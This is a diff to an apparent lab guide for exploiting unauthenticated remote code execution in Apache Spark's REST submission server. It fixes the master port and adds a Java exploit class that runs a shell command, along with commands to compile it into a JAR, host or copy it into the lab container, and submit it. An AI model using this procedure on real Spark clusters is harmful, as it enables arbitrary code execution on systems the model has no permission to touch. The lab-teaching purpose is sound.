@@ -38,10 +38,59 @@ curl -i -X POST 'http://localhost:8144/v1/submissions/create' \
       "spark.app.name": "exploit",
       "spark.eventLog.enabled": "true",
       "spark.submit.deployMode": "cluster",
-      "spark.master": "spark://localhost:6066"
+      "spark.master": "spark://localhost:7077"
     }
   }'
 ```
+
+> [!NOTE]
+> **Spark Master RPC Port**: In `sparkProperties`, `"spark.master"` must point to the Spark Master RPC port `7077` (`spark://localhost:7077` or `spark://cyberlab_industry_spark_unauth_rce:7077`), **not** the REST submission server port `6066`.
+
+### Offline / Local Exploit JAR Option
+
+If testing in an offline or air-gapped lab without external access to GitHub, you can provide the exploit JAR locally:
+
+1. **Compile your own exploit JAR**:
+
+   ```java
+   // Exploit.java
+   public class Exploit {
+       public static void main(String[] args) throws Exception {
+           Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "touch /tmp/pwned_spark"});
+       }
+   }
+   ```
+
+   Compile and package into a JAR:
+
+   ```bash
+   javac Exploit.java
+   jar -cvfe Exploit.jar Exploit Exploit.class
+   ```
+
+2. **Option A — Host via Local HTTP Server**:
+   Start a local Python HTTP server on your machine:
+
+   ```bash
+   python3 -m http.server 8000
+   ```
+
+   Set `"appResource"` and `"spark.jars"` in the submission to `http://<host-ip>:8000/Exploit.jar`.
+
+3. **Option B — Direct Local File Mount or Copy**:
+   Copy the JAR into the running Spark container:
+   ```bash
+   docker cp Exploit.jar cyberlab_industry_spark_unauth_rce:/tmp/Exploit.jar
+   ```
+   Then reference the local file URI in the submission:
+   ```json
+   "appResource": "file:///tmp/Exploit.jar",
+   "sparkProperties": {
+     "spark.jars": "file:///tmp/Exploit.jar",
+     "spark.master": "spark://localhost:7077",
+     ...
+   }
+   ```
 
 ### 3. Verify Worker Execution
 
